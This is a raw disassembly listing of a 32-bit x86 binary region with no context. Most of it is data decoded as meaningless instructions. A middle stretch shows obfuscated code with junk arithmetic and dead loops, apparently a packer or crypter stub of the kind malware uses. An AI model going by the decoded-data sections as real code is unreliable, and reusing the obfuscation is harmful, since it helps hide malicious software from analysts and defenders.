  41cd78:	and    al,0x8b
  41cd7a:	add    BYTE PTR [ebx-0x33],al
  41cd7d:	rol    edi,0xfc
  41cd80:	xor    ah,BYTE PTR [ebx+eiz*1+0x4b4c8378]
  41cd87:	(bad)  
  41cd88:	pop    ss
  41cd89:	mov    cl,0x67
  41cd8b:	popa   
  41cd8c:	loope  0x41cd5c
  41cd8e:	xcrypt-cfb (bad)
  41cd8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd90:	in     al,0xb5
  41cd92:	and    al,0x19
  41cd94:	jmp    0x3da0:0xae39a1e5
  41cd9b:	add    al,0xc4
  41cd9d:	add    al,0x9a
  41cd9f:	xor    al,0xbf
  41cda1:	aaa    
  41cda2:	mov    ch,0x50
  41cda4:	xchg   esi,eax
  41cda5:	xchg   edi,eax
  41cda6:	add    esi,ecx
  41cda8:	cmp    dl,BYTE PTR [edx-0x3519f937]
  41cdae:	push   edi
  41cdaf:	repnz loope 0x41cdb1
  41cdb2:	(bad)  
  41cdb3:	shr    edi,cl
  41cdb5:	sbb    BYTE PTR [edi],ch
  41cdb7:	repnz aas 
  41cdb9:	out    0x14,eax
  41cdbb:	cmp    esi,eax
  41cdbd:	ret    
  41cdbe:	cmp    al,0x2e
  41cdc0:	dec    esp
  41cdc1:	xchg   esi,eax
  41cdc2:	and    dh,BYTE PTR [edi]
  41cdc4:	gs dec ebp
  41cdc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cdc7:	cld    
  41cdc8:	in     al,dx
  41cdc9:	jae    0x41cd81
  41cdcb:	mov    bl,0xcf
  41cdcd:	bound  esi,QWORD PTR [edi]
  41cdcf:	loop   0x41cdb9
  41cdd1:	and    eax,0xf648f3eb
  41cdd6:	fnsave ds:0xcd3eb422
  41cddc:	xchg   DWORD PTR ss:[edx+0x1b],esp
  41cde0:	mov    BYTE PTR [ebx+ebx*4+0x42],dh
  41cde4:	sbb    ch,dh
  41cde6:	push   0xa2836dca
  41cdeb:	ror    BYTE PTR [edx+0x7319a066],0x99
  41cdf2:	aas    
  41cdf3:	pop    esi
  41cdf4:	xor    al,0xe4
  41cdf6:	mov    BYTE PTR [edi+0x765444fa],dh
  41cdfc:	sub    BYTE PTR [edx],al
  41cdfe:	lods   al,BYTE PTR ds:[esi]
  41cdff:	fild   QWORD PTR ds:0xf49d592e
  41ce05:	lahf   
  41ce06:	inc    edi
  41ce07:	popf   
  41ce08:	push   cs
  41ce09:	adc    BYTE PTR [ebx+0x58],bl
  41ce0c:	fs jge 0x41ce8a
  41ce0f:	test   DWORD PTR [esi],0x151b5508
  41ce15:	mov    dh,0xca
  41ce17:	mov    ah,0x2f
  41ce19:	sbb    eax,0x228bdde
  41ce1e:	(bad)  
  41ce1f:	(bad)  
  41ce20:	outs   dx,DWORD PTR ds:[esi]
  41ce21:	(bad)  
  41ce22:	mov    edi,0xe958df32
  41ce27:	cmp    ch,BYTE PTR ss:0xd4ee729b
  41ce2e:	cmp    eax,0xbd13019d
  41ce33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce35:	mov    eax,0xa2e72cbd
  41ce3a:	mov    eax,ds:0x5051f27c
  41ce3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce40:	repz mov esi,DWORD PTR [eax+eax*4+0x42237447]
  41ce48:	enter  0x76a9,0xf8
  41ce4c:	sub    al,0x60
  41ce4e:	inc    esi
  41ce4f:	ret    0x1fe5
  41ce52:	cmp    DWORD PTR [edx-0x2a140868],0xfffffffc
  41ce59:	jo     0x41cdfe
  41ce5b:	cmp    al,0x3
  41ce5d:	arpl   WORD PTR [eax],di
  41ce5f:	push   ebp
  41ce60:	lods   al,BYTE PTR ds:[esi]
  41ce61:	out    dx,al
  41ce62:	xchg   ebx,eax
  41ce63:	fiadd  DWORD PTR [edi-0xabb66f6]
  41ce69:	sub    edx,edx
  41ce6b:	pop    ds
  41ce6c:	adc    eax,0x984e94f6
  41ce71:	and    al,0xf7
  41ce73:	push   0x42a3626e
  41ce78:	push   eax
  41ce79:	or     DWORD PTR [ebx],ebp
  41ce7b:	shr    esp,1
  41ce7d:	fsub   QWORD PTR [ecx]
  41ce7f:	dec    ebp
  41ce80:	xor    eax,edi
  41ce82:	in     eax,0x23
  41ce84:	mov    dl,0x88
  41ce86:	out    0x74,al
  41ce88:	mov    ebp,DWORD PTR [edx-0x40]
  41ce8b:	(bad)  
  41ce8c:	js     0x41cead
  41ce8e:	lods   al,BYTE PTR ds:[esi]
  41ce8f:	daa    
  41ce90:	mov    al,ds:0x523c6834
  41ce95:	test   BYTE PTR [esi-0x4e311972],al
  41ce9b:	xor    esi,ebx
  41ce9d:	jl     0x41cee9
  41ce9f:	fisub  WORD PTR [ebx-0x6109047d]
  41cea5:	mov    edx,ds
  41cea7:	pop    edi
  41cea8:	push   0xffffffc0
  41ceaa:	or     eax,0x3aafd513
  41ceaf:	push   0xd9a70d8a
  41ceb4:	jmp    0x813f:0xbc665bba
  41cebb:	jl     0x41ce94
  41cebd:	fcmovne st,st(1)
  41cebf:	test   DWORD PTR [edi],ebp
  41cec1:	adc    DWORD PTR ds:0x52611c3b,esi
  41cec7:	inc    ebx
  41cec8:	inc    cl
  41ceca:	mov    ebp,0xd9bd9945
  41cecf:	mov    ebp,0xded31a42
  41ced4:	data16 mov dh,0xf8
  41ced7:	fsubr  DWORD PTR gs:[edi+0x3d]
  41cedb:	cld    
  41cedc:	mov    eax,0x14ec7292
  41cee1:	cdq    
  41cee2:	xchg   ebx,eax
  41cee3:	push   edi
  41cee4:	mov    dl,0x9a
  41cee6:	(bad)  
  41cee7:	adc    DWORD PTR [ebp+0x11],ebp
  41ceea:	popa   
  41ceeb:	loop   0x41ce7e
  41ceed:	xor    al,0xf3
  41ceef:	or     al,0x54
  41cef1:	imul   BYTE PTR [ebx-0x36]
  41cef4:	dec    esi
  41cef5:	imul   edx,DWORD PTR [ebp-0x3],0xfffffff6
  41cef9:	iret   
  41cefa:	dec    eax
  41cefb:	loope  0x41cf60
  41cefd:	lods   eax,DWORD PTR ds:[esi]
  41cefe:	or     DWORD PTR ds:0xace5b53d,ebx
  41cf04:	ret    
  41cf05:	mov    esi,0x397fa4d6
  41cf0a:	scas   al,BYTE PTR es:[edi]
  41cf0b:	adc    eax,0xca388fdb
  41cf10:	sbb    edi,DWORD PTR [esi]
  41cf12:	test   DWORD PTR [ecx],edx
  41cf14:	in     al,dx
  41cf15:	push   ebx
  41cf16:	pop    es
  41cf17:	add    eax,0x5dbf3cde
  41cf1c:	sbb    edi,ecx
  41cf1e:	imul   eax,DWORD PTR [ebx],0xabaa5fae
  41cf24:	pop    ebx
  41cf25:	mov    ds:0x7c823438,eax
  41cf2a:	pop    ecx
  41cf2b:	dec    edi
  41cf2c:	push   ecx
  41cf2d:	sbb    ah,BYTE PTR ds:0x6fd207ab
  41cf33:	ins    DWORD PTR es:[edi],dx
  41cf34:	cld    
  41cf35:	cmp    al,0x37
  41cf37:	inc    ebx
  41cf38:	mov    ebp,0x327338a4
  41cf3d:	mov    eax,0xa6aec06a
  41cf42:	or     eax,0x38be9334
  41cf47:	ret    0x2dc2
  41cf4a:	ret    
  41cf4b:	jns    0x41cf73
  41cf4d:	jnp    0x41cf3b
  41cf4f:	cmp    al,0xa1
  41cf51:	adc    BYTE PTR [ebp+0x67],bh
  41cf54:	sub    al,0xae
  41cf56:	fs mov ebp,0x2aad709c
  41cf5c:	(bad)  
  41cf5d:	jle    0x41cf54
  41cf5f:	adc    BYTE PTR [ebx+0x3c7de5fb],dh
  41cf65:	pop    ds
  41cf66:	(bad)  
  41cf67:	iret   
  41cf68:	in     eax,0xad
  41cf6a:	(bad)  
  41cf6b:	mov    gs,ecx
  41cf6d:	in     al,0x58
  41cf6f:	fs popa 
  41cf71:	sub    BYTE PTR [eax-0x26],ch
  41cf74:	test   DWORD PTR [edi+esi*4+0x9da817f],ecx
  41cf7b:	mov    al,0x58
  41cf7d:	iret   
  41cf7e:	adc    eax,0x7be8ce0a
  41cf83:	adc    BYTE PTR [ecx+0x13],bl
  41cf86:	xor    edx,DWORD PTR [edi+0x7967d22a]
  41cf8c:	sbb    al,ah
  41cf8e:	dec    ebx
  41cf8f:	xor    eax,DWORD PTR [esi+0x13]
  41cf92:	rcl    cl,cl
  41cf94:	or     DWORD PTR [ebx+ebp*8],ebp
  41cf97:	retf   0xf28b
  41cf9a:	dec    BYTE PTR [edx+0x49]
  41cf9d:	adc    DWORD PTR [edx-0x74],esp
  41cfa0:	xchg   esi,eax
  41cfa1:	jecxz  0x41cfc2
  41cfa3:	jno    0x41cfdc
  41cfa5:	mov    bh,0x16
  41cfa7:	sar    BYTE PTR ds:0x16c8e5c7,cl
  41cfad:	fwait
  41cfae:	fwait
  41cfaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfb0:	adc    BYTE PTR [esi-0x4039c2e1],ah
  41cfb6:	add    BYTE PTR [esi-0x707f99b5],ah
  41cfbc:	inc    esp
  41cfbd:	inc    esi
  41cfbe:	push   edx
  41cfbf:	push   ebx
  41cfc0:	mov    dh,0x84
  41cfc2:	xchg   edx,eax
  41cfc3:	cmp    dh,bh
  41cfc5:	sub    al,0x44
  41cfc7:	add    ecx,DWORD PTR [esi]
  41cfc9:	cwde   
  41cfca:	xchg   ebx,eax
  41cfcb:	rol    BYTE PTR [ebp-0x3e],cl
  41cfce:	cmp    BYTE PTR [ebx-0xec021ec],ah
  41cfd4:	xor    eax,0x1d60a2a5
  41cfd9:	and    eax,0x99e85647
  41cfde:	pop    edx
  41cfdf:	icebp  
  41cfe0:	cli    
  41cfe1:	int    0x15
  41cfe3:	xchg   BYTE PTR [edi+0x12069ebd],dh
  41cfe9:	nop
  41cfea:	mov    ebx,0x5fd6aee8
  41cfef:	lods   al,BYTE PTR ds:[esi]
  41cff0:	sub    ecx,DWORD PTR [eax]
  41cff2:	xor    eax,0x5f2e1f7d
  41cff7:	lea    esi,[ecx]
  41cff9:	push   es
  41cffa:	fwait
  41cffb:	pop    es
  41cffc:	cmp    BYTE PTR [ecx-0x6a],0xb8
  41d000:	jmp    0x918b2fca
  41d005:	ret    
  41d006:	mov    DWORD PTR [edx+edx*4+0x43bbde63],edx
  41d00d:	shl    BYTE PTR [esi],0x81
  41d010:	xor    BYTE PTR [ebx+0x2fca345d],al
  41d016:	xchg   ebp,eax
  41d017:	lea    esp,[ebp-0x4171e7df]
  41d01d:	mov    ah,0x8a
  41d01f:	xchg   BYTE PTR [edi+eax*8-0x1d2ce87b],dl
  41d026:	in     al,dx
  41d027:	cs enter 0x4760,0xc6
  41d02c:	jbe    0x41cfba
  41d02e:	mov    ebx,0xa08de11a
  41d033:	xchg   esi,eax
  41d034:	cmp    ch,dh
  41d036:	rcl    DWORD PTR [eax+0x65f8aabc],cl
  41d03c:	push   cs
  41d03d:	fld    QWORD PTR [ebx+0x145cc00b]
  41d043:	(bad)  
  41d045:	or     dh,cl
  41d047:	push   ebp
  41d048:	dec    ebp
  41d049:	rcl    dh,1
  41d04b:	je     0x41d020
  41d04d:	jne    0x41cfed
  41d04f:	sbb    BYTE PTR [esi],ah
  41d051:	int    0xe9
  41d053:	test   al,0x41
  41d055:	pop    esi
  41d056:	jo     0x41d068
  41d058:	bound  ebp,QWORD PTR [edx-0x1e]
  41d05b:	mov    edx,0xd9db23dd
  41d060:	popf   
  41d061:	inc    edx
  41d062:	push   0x55cbe7a4
  41d067:	mov    edx,0x389d4c61
  41d06c:	jo     0x41cfef
  41d06e:	repz jle 0x41d05c
  41d071:	inc    eax
  41d072:	fisttp QWORD PTR [ebx-0x3dafc0e1]
  41d078:	mov    ebp,0x9a13595d
  41d07d:	dec    eax
  41d07e:	test   edx,ebp
  41d080:	xchg   esp,eax
  41d081:	fdivrp st(4),st
  41d083:	sub    dh,cl
  41d085:	out    0xb0,al
  41d087:	pop    esp
  41d088:	inc    edx
  41d089:	add    DWORD PTR [edx+0x53e55cc],ecx
  41d08f:	mov    WORD PTR [ecx-0x2a],ds
  41d092:	xchg   esi,eax
  41d093:	inc    ebp
  41d094:	cwde   
  41d095:	dec    edx
  41d096:	mov    al,0xb9
  41d098:	es or  al,0x36
  41d09b:	inc    edi
  41d09c:	leave  
  41d09d:	and    ebp,DWORD PTR [esi+edx*4]
  41d0a0:	aas    
  41d0a1:	fild   WORD PTR [ecx]
  41d0a3:	sar    BYTE PTR [edi-0x67b6691d],1
  41d0a9:	aad    0xdd
  41d0ab:	xchg   ebx,eax
  41d0ac:	loopne 0x41d0a1
  41d0ae:	mov    BYTE PTR [eax+0x7c],ah
  41d0b1:	bound  eax,QWORD PTR [ebx]
  41d0b3:	push   ebx
  41d0b4:	stos   BYTE PTR es:[edi],al
  41d0b5:	push   0x3c
  41d0b7:	xchg   edi,eax
  41d0b8:	into   
  41d0b9:	pop    eax
  41d0ba:	call   0x1dd6:0xb85edac9
  41d0c1:	das    
  41d0c2:	imul   ecx,DWORD PTR [ebx],0xf70d47c
  41d0c8:	sub    al,0xfb
  41d0ca:	loope  0x41d06f
  41d0cc:	cbw    
  41d0ce:	cmp    ecx,esi
  41d0d0:	sbb    al,0xb0
  41d0d2:	or     bl,BYTE PTR [ecx+0x5ece10ca]
  41d0d8:	ins    BYTE PTR es:[edi],dx
  41d0d9:	bswap  esp
  41d0db:	outs   dx,DWORD PTR ds:[esi]
  41d0dc:	fbstp  TBYTE PTR [eax+0x3e]
  41d0df:	stc    
  41d0e0:	popa   
  41d0e1:	aad    0x7e
  41d0e3:	sub    al,0x8
  41d0e5:	cmp    eax,0x8124dc42
  41d0ea:	arpl   dx,di
  41d0ec:	sbb    DWORD PTR ss:[esi],ebx
  41d0ef:	cmp    ebp,edx
  41d0f1:	mov    BYTE PTR [edi+0x76eca851],bl
  41d0f7:	ror    DWORD PTR [ebp-0x3f5fadab],1
  41d0fd:	mov    DWORD PTR [esi-0x23222ce5],esi
  41d103:	adc    DWORD PTR [ebp+0x53],esp
  41d106:	dec    ebp
  41d107:	jl     0x41d11a
  41d109:	xor    eax,0x66228ce2
  41d10e:	daa    
  41d10f:	(bad)  
  41d110:	push   ds
  41d111:	pop    ss
  41d112:	mov    esp,0xad0c16b3
  41d117:	push   edx
  41d118:	aaa    
  41d119:	test   eax,0x9c0afadd
  41d11e:	rol    bl,1
  41d120:	shr    DWORD PTR [eax+edi*4],1
  41d123:	or     al,0x4f
  41d125:	call   0x452e675b
  41d12a:	sbb    eax,0xea96edf4
  41d12f:	pop    edi
  41d130:	test   al,0x86
  41d132:	xchg   ebx,eax
  41d133:	push   eax
  41d134:	adc    bh,dh
  41d136:	mov    BYTE PTR [edx+ecx*8],0xea
  41d13a:	cdq    
  41d13b:	sbb    al,0x13
  41d13e:	mov    esi,edi
  41d140:	idiv   DWORD PTR cs:[edx+ebx*2+0x44c8e690]
  41d148:	int    0xcd
  41d14a:	adc    DWORD PTR [ecx-0x317f7259],0xb79373a8
  41d154:	mov    esi,?
  41d156:	or     BYTE PTR ds:0x7909d601,bl
  41d15c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d15d:	mov    edx,0x4442a063
  41d162:	int    0x9f
  41d164:	out    dx,eax
  41d165:	addr16 sub eax,0x60adeb8a
  41d16b:	and    BYTE PTR ds:0x88cf0a49,0xf8
  41d172:	jmp    0x41d0f7
  41d174:	(bad)  
  41d175:	lods   al,BYTE PTR ds:[esi]
  41d176:	(bad)  
  41d177:	aaa    
  41d178:	sub    BYTE PTR [ebp-0x2e],ch
  41d17b:	mov    al,0x47
  41d17d:	pop    ds
  41d17e:	pop    eax
  41d17f:	mov    ch,dl
  41d181:	outs   dx,DWORD PTR ds:[esi]
  41d182:	daa    
  41d183:	mov    ebp,esi
  41d185:	mov    eax,ds:0xd1911b91
  41d18a:	jp     0x41d1f8
  41d18c:	xchg   esp,eax
  41d18d:	and    edi,DWORD PTR [ecx+0x15]
  41d190:	cmp    ebp,DWORD PTR [ebp+0x53551f90]
  41d196:	add    al,ah
  41d198:	pop    esp
  41d199:	sar    DWORD PTR [esi],1
  41d19b:	popf   
  41d19c:	cld    
  41d19d:	jae    0x41d16e
  41d19f:	call   0xe0db58e6
  41d1a4:	loope  0x41d1b4
  41d1a6:	popf   
  41d1a7:	outs   dx,BYTE PTR ds:[esi]
  41d1a8:	mov    ds:0x2cf09411,eax
  41d1ad:	in     al,dx
  41d1ae:	icebp  
  41d1af:	sbb    eax,0xf75cbbf
  41d1b4:	inc    esi
  41d1b5:	sbb    ecx,DWORD PTR [edi+0x5e]
  41d1b8:	jns    0x41d179
  41d1ba:	pushf  
  41d1bb:	and    DWORD PTR [edx+0x4c77f13],esi
  41d1c1:	imul   edi,DWORD PTR [esi+0x5fce223c],0x1a
  41d1c8:	xchg   edx,eax
  41d1c9:	cmp    al,0x1b
  41d1cb:	fwait
  41d1cc:	into   
  41d1cd:	sbb    ch,BYTE PTR [edi]
  41d1cf:	mov    esi,0x20b1417f
  41d1d4:	ret    
  41d1d5:	pop    esi
  41d1d6:	dec    ebp
  41d1d7:	add    DWORD PTR [ebp-0x23e2dfbd],ebx
  41d1dd:	mov    bl,0x35
  41d1df:	pop    ebx
  41d1e0:	iret   
  41d1e1:	mov    ch,0x58
  41d1e3:	cmp    BYTE PTR [edi+0x53],0x80
  41d1e7:	fsub   st,st(4)
  41d1e9:	xchg   BYTE PTR [ebx+0x3112638e],dl
  41d1ef:	jge    0x41d247
  41d1f1:	jb     0x41d259
  41d1f3:	dec    edi
  41d1f4:	adc    al,0xaa
  41d1f6:	pop    edi
  41d1f7:	pushf  
  41d1f8:	stc    
  41d1f9:	les    eax,FWORD PTR ds:0xf06ab0df
  41d1ff:	outs   dx,BYTE PTR ds:[esi]
  41d200:	clc    
  41d201:	cld    
  41d202:	sti    
  41d203:	fistp  DWORD PTR [edi+0x7d]
  41d206:	stos   BYTE PTR es:[edi],al
  41d207:	fs jmp 0x96b883ba
  41d20d:	push   esp
  41d20e:	popa   
  41d20f:	inc    esi
  41d210:	xor    eax,0xfba2d4a0
  41d215:	test   BYTE PTR [esi+0x6f],ah
  41d218:	and    al,0x15
  41d21a:	push   ecx
  41d21b:	adc    cl,dl
  41d21d:	dec    edi
  41d21e:	in     eax,dx
  41d21f:	push   eax
  41d220:	push   0xffffffde
  41d222:	push   ecx
  41d223:	mov    al,0x3d
  41d225:	mov    esp,0x5bcb64eb
  41d22a:	test   al,0x33
  41d22c:	ins    DWORD PTR es:[edi],dx
  41d22d:	mov    esi,0xbbfb179c
  41d232:	dec    eax
  41d233:	int    0x37
  41d235:	into   
  41d236:	daa    
  41d237:	add    esp,DWORD PTR [edi+eax*1]
  41d23a:	pop    ss
  41d23b:	jne    0x41d2b8
  41d23d:	mov    esi,0xe2b3f38
  41d242:	or     eax,0x5f6fcb4a
  41d247:	xchg   esi,eax
  41d248:	test   DWORD PTR [edx],0x9dc293ca
  41d24e:	cdq    
  41d24f:	fisttp DWORD PTR [bx+si+0x5f27]
  41d254:	dec    edi
  41d255:	sahf   
  41d256:	repz or BYTE PTR [edi+0x4d],ch
  41d25a:	xor    edx,edi
  41d25c:	lock imul esi,DWORD PTR [ebp+0x21],0xebf4719d
  41d264:	loope  0x41d234
  41d266:	cmp    ebx,0x16f22aea
  41d26c:	scas   eax,DWORD PTR es:[edi]
  41d26d:	aad    0x7f
  41d26f:	push   esp
  41d270:	(bad)  
  41d271:	dec    edx
  41d272:	repnz mov edi,0x28f0522f
  41d278:	loop   0x41d2d4
  41d27a:	cmp    eax,0xd8aa47ed
  41d27f:	outs   dx,BYTE PTR ds:[esi]
  41d280:	imul   ebx,DWORD PTR [edx],0xc2b0aa8e
  41d286:	fwait
  41d287:	aaa    
  41d288:	push   0x16
  41d28a:	test   eax,0x316ae597
  41d28f:	jb     0x41d30e
  41d291:	mov    ah,BYTE PTR [eax]
  41d293:	mov    eax,ds:0x37d31cb2
  41d298:	js     0x41d2e4
  41d29a:	cmp    eax,0xeb47d054
  41d29f:	outs   dx,BYTE PTR ds:[esi]
  41d2a0:	sub    bh,dl
  41d2a2:	push   esi
  41d2a3:	fdiv   QWORD PTR [edx]
  41d2a5:	das    
  41d2a6:	fs leave 
  41d2a8:	push   es
  41d2a9:	push   0x917ade00
  41d2ae:	fisttp QWORD PTR ds:0x88b3e2fb
  41d2b4:	mov    ecx,0x3f3e6da1
  41d2b9:	out    0x61,al
  41d2bb:	adc    bl,BYTE PTR [edx-0x275ddbe2]
  41d2c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2c2:	push   0x58
  41d2c4:	pop    edi
  41d2c5:	repz adc BYTE PTR [edx-0x787abf70],dh
  41d2cc:	jp     0x41d325
  41d2ce:	xor    cl,BYTE PTR [edx-0x3fe5772d]
  41d2d4:	dec    eax
  41d2d5:	cmp    al,0xa5
  41d2d7:	imul   esi,DWORD PTR [eax+ebx*8+0x5e27508b],0xffffffd7
  41d2df:	sbb    DWORD PTR [eax],edi
  41d2e1:	lods   eax,DWORD PTR ds:[esi]
  41d2e2:	adc    bh,BYTE PTR [eax+0x4571d1c1]
  41d2e8:	sahf   
  41d2e9:	shr    esp,cl
  41d2eb:	dec    eax
  41d2ec:	xchg   ecx,eax
  41d2ed:	inc    ecx
  41d2ee:	xchg   esi,eax
  41d2ef:	enter  0x7585,0xc1
  41d2f3:	sub    eax,0x7552148d
  41d2f8:	ficom  WORD PTR [edi]
  41d2fa:	scas   eax,DWORD PTR es:[edi]
  41d2fb:	xor    ch,BYTE PTR [ebp+0x2c72ddc2]
  41d301:	add    ecx,DWORD PTR [ecx-0x5d5fee25]
  41d307:	push   edx
  41d308:	scas   eax,DWORD PTR es:[edi]
  41d309:	mov    esp,0x396e92c7
  41d30e:	mov    ah,0x6a
  41d310:	dec    ebx
  41d311:	(bad)  
  41d312:	icebp  
  41d313:	ret    
  41d314:	xchg   ebp,eax
  41d315:	cld    
  41d316:	mov    ecx,0xb81aa091
  41d31b:	aam    0x15
  41d31d:	and    dh,dh
  41d31f:	gs cwde 
  41d321:	mov    edi,0x7b623423
  41d326:	ret    0x9644
  41d329:	mov    ebp,0x3ea25211
  41d32e:	div    DWORD PTR [esi]
  41d330:	outs   dx,DWORD PTR ds:[esi]
  41d331:	dec    esi
  41d332:	cld    
  41d333:	jle    0x41d2f8
  41d335:	inc    ecx
  41d336:	fild   QWORD PTR [edx]
  41d338:	jmp    0xa5c5:0x4d38b1f8
  41d33f:	rcl    DWORD PTR [ebp+0x56],0xb5
  41d343:	or     al,0x99
  41d345:	cld    
  41d346:	push   ss
  41d347:	push   0x49bf89ed
  41d34c:	cmp    al,BYTE PTR [edi-0x3]
  41d34f:	pop    ebx
  41d350:	push   eax
  41d351:	into   
  41d352:	fadd   QWORD PTR [ebp-0xa780d26]
  41d358:	(bad)  [esi+eiz*2+0x499899e2]
  41d35f:	scas   al,BYTE PTR es:[edi]
  41d360:	aam    0xbd
  41d362:	push   ds
  41d363:	cld    
  41d364:	xor    edi,edi
  41d366:	pop    ebx
  41d367:	mov    ah,0x90
  41d369:	fstp   QWORD PTR [esi+0x5e]
  41d36c:	inc    ecx
  41d36d:	xor    ah,BYTE PTR [eax-0x52]
  41d370:	hlt    
  41d371:	and    BYTE PTR [edi-0x4c039bc8],dh
  41d377:	test   al,0x37
  41d379:	test   BYTE PTR [eax-0x5a],dl
  41d37c:	sub    esp,DWORD PTR [ecx]
  41d37e:	push   esp
  41d37f:	sahf   
  41d380:	shl    DWORD PTR [ebx],cl
  41d382:	cld    
  41d383:	shl    esi,cl
  41d385:	push   0x75
  41d387:	xchg   DWORD PTR [edi],ebx
  41d389:	add    edx,edi
  41d38b:	and    edx,ebx
  41d38d:	mov    DWORD PTR [ebp-0x4c],edx
  41d390:	xor    DWORD PTR ds:0x42a2d2,0x7dd7
  41d39a:	mov    edx,DWORD PTR [ebp+0x8]
  41d39d:	mov    ebx,DWORD PTR [ebp-0x48]
  41d3a0:	lea    edx,[ebx+edx*1+0x241fcdf]
  41d3a7:	mov    DWORD PTR [ebp-0x48],edx
  41d3aa:	mov    edx,DWORD PTR [ebp+0x8]
  41d3ad:	mov    ebx,0xfa5e1524
  41d3b2:	sub    ebx,edx
  41d3b4:	mov    DWORD PTR ds:0x42a27a,0x17
  41d3be:	cmp    DWORD PTR ds:0x42a27a,0x0
  41d3c5:	je     0x41d3ff
  41d3cb:	cmp    DWORD PTR ds:0x42a27a,0x25
  41d3d2:	jge    0x41d3ff
  41d3d8:	jmp    0x41d3ed
  41d3dd:	push   0x42a2be
  41d3e2:	push   0x429181
  41d3e7:	call   DWORD PTR ds:0x42a3ca
  41d3ed:	mov    edx,DWORD PTR ds:0x42a27a
  41d3f3:	dec    edx
  41d3f4:	mov    DWORD PTR ds:0x42a27a,edx
  41d3fa:	jmp    0x41d3be
  41d3ff:	add    ebx,DWORD PTR [ebp-0x44]
  41d402:	and    DWORD PTR ds:0x42a25a,ebx
  41d408:	mov    DWORD PTR [ebp-0x44],ebx
  41d40b:	mov    edx,DWORD PTR [ebp+0x8]
  41d40e:	sub    DWORD PTR ds:0x42a25e,0x69af
  41d418:	xor    edx,eax
  41d41a:	adc    DWORD PTR ds:0x42a2e6,0x774b
  41d424:	add    edx,esi
  41d426:	mov    DWORD PTR ds:0x42a2ae,0x6366
  41d430:	jne    0x418abe
  41d436:	jmp    0x421e4f
  41d43b:	adc    DWORD PTR ds:0x42a2d2,edx
  41d441:	mov    edx,DWORD PTR [ebp-0xc]
  41d444:	sub    DWORD PTR ds:0x42a2ae,0x4e6d
  41d44e:	sub    edx,esi
  41d450:	xor    edx,eax
  41d452:	sbb    DWORD PTR ds:0x42a2c6,0x8d4
  41d45c:	mov    DWORD PTR [ebp-0x5c],edx
  41d45f:	dec    DWORD PTR ds:0x42a2c2
  41d465:	mov    edx,DWORD PTR [ebp-0x10]
  41d468:	xor    DWORD PTR ds:0x42a2a2,0x42a286
  41d472:	mov    ebx,DWORD PTR [ebp-0x8]
  41d475:	and    DWORD PTR ds:0x42a2ca,0x42a292
  41d47f:	xor    edx,eax
  41d481:	xor    ebx,eax
  41d483:	add    DWORD PTR ds:0x42a29a,0x42a2c2
  41d48d:	sub    edx,ebx
  41d48f:	sub    edx,esi
  41d491:	xor    edx,eax
  41d493:	mov    DWORD PTR [ebp-0x10],edx
  41d496:	mov    edx,DWORD PTR [ebp-0x14]
  41d499:	mov    DWORD PTR [ebp+0x8],edx
  41d49c:	jmp    0x41f8db
  41d4a1:	sbb    edx,ebx
  41d4a3:	mov    edx,DWORD PTR [ebp+0x8]
  41d4a6:	sbb    ebx,DWORD PTR ds:0x42a25a
  41d4ac:	mov    ebx,DWORD PTR [ebp-0x8]
  41d4af:	xor    edx,eax
  41d4b1:	xor    ebx,eax
  41d4b3:	or     DWORD PTR ds:0x42a2f6,0x42a266
  41d4bd:	sub    edx,ebx
  41d4bf:	movzx  ebx,BYTE PTR ds:0x42a2a6
  41d4c6:	sbb    ebx,DWORD PTR ds:0x42a262
  41d4cc:	mov    DWORD PTR ds:0x42a2a6,ebx
  41d4d2:	sub    edx,esi
  41d4d4:	xor    edx,eax
  41d4d6:	mov    DWORD PTR [ebp+0x8],edx
  41d4d9:	mov    DWORD PTR ds:0x42a2b2,0x1f
  41d4e3:	cmp    DWORD PTR ds:0x42a2b2,0x0
  41d4ea:	je     0x41d526
  41d4f0:	cmp    DWORD PTR ds:0x42a2b2,0x21
  41d4f7:	jle    0x41d526
  41d4fd:	jmp    0x41d512
  41d502:	push   0x1ea3
  41d507:	push   0x42a29e
  41d50c:	call   DWORD PTR ds:0x42a3ce
  41d512:	xor    edx,edx
  41d514:	xor    edx,DWORD PTR ds:0x42a2b2
  41d51a:	dec    edx
  41d51b:	mov    DWORD PTR ds:0x42a2b2,edx
  41d521:	jmp    0x41d4e3
  41d526:	mov    edx,DWORD PTR [ebp+0x8]
  41d529:	mov    ebx,DWORD PTR [ebp-0x58]
  41d52c:	add    edx,0x5708fa
  41d532:	imul   edx,ebx
  41d535:	mov    DWORD PTR [ebp-0x58],edx
  41d538:	mov    edx,DWORD PTR [ebp+0x8]
  41d53b:	mov    ebx,DWORD PTR [ebp-0x54]
  41d53e:	add    edx,0x64f898
  41d544:	or     edx,ebx
  41d546:	mov    DWORD PTR [ebp-0x54],edx
  41d549:	jmp    0x41f8a1
  41d54e:	in     al,0xd
  41d550:	in     al,0xc4
  41d552:	xchg   BYTE PTR [esi-0x72a2f23c],al
  41d558:	retf   0x3ee7
  41d55b:	jge    0x41d5b6
  41d55d:	pusha  
  41d55e:	dec    ebp
  41d55f:	fstp   TBYTE PTR [ebx+eax*4+0x46]
  41d563:	pop    esi
  41d564:	add    DWORD PTR [ebx-0x3f76c41d],0x63
  41d56b:	push   esi
  41d56c:	jp     0x41d580
  41d56e:	ja     0x41d580
  41d570:	fistp  WORD PTR [ebx+eiz*1]
  41d573:	or     BYTE PTR [edx+eiz*4+0x5f],cl
  41d577:	sub    bl,ah
  41d579:	cli    
  41d57a:	mov    esi,0xbb8f5b40
  41d57f:	popf   
  41d580:	dec    eax
  41d581:	pextrw edx,(bad),0xc5
  41d583:	push   edx
  41d584:	xor    BYTE PTR [ebp-0xc553863],0x1e
  41d58b:	cmp    al,0x8a
  41d58d:	mul    BYTE PTR [ebx]
  41d58f:	sar    esi,0x53
  41d592:	mov    cl,0x56
  41d594:	adc    ch,bl
  41d596:	int    0x3e
  41d598:	inc    edi
  41d599:	push   0xfa016a85
  41d59e:	test   al,0x14
  41d5a0:	and    BYTE PTR [edi-0x61],al
  41d5a3:	stos   BYTE PTR es:[edi],al
  41d5a4:	aaa    
